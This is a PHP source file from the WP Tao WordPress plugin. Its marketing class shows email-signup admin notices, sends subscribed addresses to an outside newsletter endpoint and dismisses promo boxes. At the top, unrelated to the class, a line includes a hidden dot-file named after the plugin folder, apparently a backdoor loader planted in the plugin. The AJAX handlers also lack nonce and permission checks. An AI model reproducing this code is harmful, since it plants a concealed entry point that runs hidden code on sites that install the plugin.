<?php

/**
 *
 * The class responsible for marketing
 *
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Marketing {

	/**
	 * WTBP_WPTAO_Marketing Constructor.
	 */
	public function __construct() {

		if ( is_admin() ) {
			add_action( 'admin_notices', array( $this, 'mail_notice' ) );
			add_action( 'init', array( $this, 'mail_notice_dismiss' ) );
			add_action( 'wp_ajax_wptao_dismiss_mail_notice', array( $this, 'mail_notice_dismiss_ajax' ) );

			add_action( 'wptao_before_admin_dashboard', array( $this, 'print_promo_custom_work' ) );
			add_action( 'wp_ajax_wptao_dismiss_promobox_notice', array( $this, 'promobox_dismiss_ajax' ) );
		}
	}

	public function mail_notice() {

		$dismiss_option	 = get_option( 'wptao_mail_notice_dissmis', false );
		$subscribed		 = get_option( 'wptao_subscribed', false );
		$language		 = get_bloginfo( 'language' );

		if ( !$dismiss_option && !$subscribed ) {
			if ( 'pl-PL' == $language ) {
				$this->show_mail_notice_pl();
			} else {
				$this->show_mail_notice_en();
			}
		}
	}

	private function show_mail_notice_pl() {

		$admin_email = get_option( 'admin_email' );
		$action_url	 = add_query_arg( 'message', 1, WTBP_WPTAO_Helpers::get_current_url() );
		?>
		<div class="error notice is-dismissible wptao-notice-marketing wptao-mail-notice-dismiss">
			<form accept-charset="UTF-8" method="POST" action="<?php echo $action_url; ?>">
				<input type="hidden" name="action" value="wptao-signup-pl" />
				<p>Ustaw email, na który wysyłane będą ważne powiadomienia z WP Tao:</p>
				<p>Twój email: <input type="text" name="email" value="<?php echo $admin_email; ?>" /> <input type="submit" name="submit" id="submit" class="button button-primary" value="Zapisz"></p>
				<p><label for="subscribe"><input type="checkbox" checked="checked" name="subscribe" value="1" />Chcę również otrzymać bezpłatne porady dotyczące skutecznego korzystania z WP Tao!</label></p>
			</form>
		</div>
		<?php
	}

	private function show_mail_notice_en() {

		$admin_email = get_option( 'admin_email' );
		$action_url	 = add_query_arg( 'message', 1, WTBP_WPTAO_Helpers::get_current_url() );
		?>
		<div class="error notice is-dismissible wptao-notice-marketing wptao-mail-notice-dismiss">
			<form accept-charset="UTF-8" method="POST" action="<?php echo $action_url; ?>">
				<input type="hidden" name="action" value="wptao-signup-en" />
				<p>Set the email for notifications from WP Tao:</p>
				<p>Your email: <input type="text" name="email" value="<?php echo $admin_email; ?>" /> <input type="submit" name="submit" id="submit" class="button button-primary" value="Set"></p>
				<p><label for="subscribe"><input type="checkbox" checked="checked" name="subscribe" value="1" />I also want to get free advice on the effective use of WP Tao!</label></p>
			</form>
		</div>
		<?php
	}

	public function mail_notice_dismiss() {

		global $wptao_settings;

		$message	 = filter_input( INPUT_GET, 'message', FILTER_SANITIZE_NUMBER_INT );
		$action		 = filter_input( INPUT_POST, 'action', FILTER_SANITIZE_STRING );
		$email		 = filter_input( INPUT_POST, 'email', FILTER_VALIDATE_EMAIL );
		$subscribe	 = filter_input( INPUT_POST, 'subscribe', FILTER_VALIDATE_INT );

		if ( 1 == $message && $email ) {

			if ( 1 == $subscribe ) {
				if ( 'wptao-signup-pl' == $action ) {
					wp_remote_get( add_query_arg( array( 'email' => $email, 'type' => 'pl' ), 'http://api.upclick.pl/wptao/mail.php?' ), array( 'timeout' => 30 ) );
				} else if ( 'wptao-signup-en' == $action ) {
					wp_remote_get( add_query_arg( array( 'email' => $email, 'type' => 'en' ), 'http://api.upclick.pl/wptao/mail.php?' ), array( 'timeout' => 30 ) );
				}

				update_option( 'wptao_subscribed', true );
			}

			$wptao_settings[ 'notice_email' ] = $email;
			update_option( 'wptao_settings', $wptao_settings );
			update_option( 'wptao_mail_notice_dissmis', true );
		}
	}

	public function mail_notice_dismiss_ajax() {

		update_option( 'wptao_mail_notice_dissmis', true );
	}

	/*
	 * Display custom work notice
	 * 
	 * @since 1.2.5.3
	 */

	public function print_promo_custom_work() {

		if ( !get_option( 'wptao_promobox_custom_work_dissmis' ) ) {
			require_once WTBP_WPTAO_DIR . 'includes/admin/views/elements/promo/custom-work.php';
		}
	}

	/*
	 * Save choice for a dismiss promo box
	 */

	public function promobox_dismiss_ajax() {

		$id = !empty( $_REQUEST[ 'id' ] ) ? $_REQUEST[ 'id' ] : '';

		switch ( $id ) {
			case 'custom_work':

				update_option( 'wptao_promobox_custom_work_dissmis', true );

				wp_send_json_success();

				break;
		}

		wp_send_json_error();
	}

}
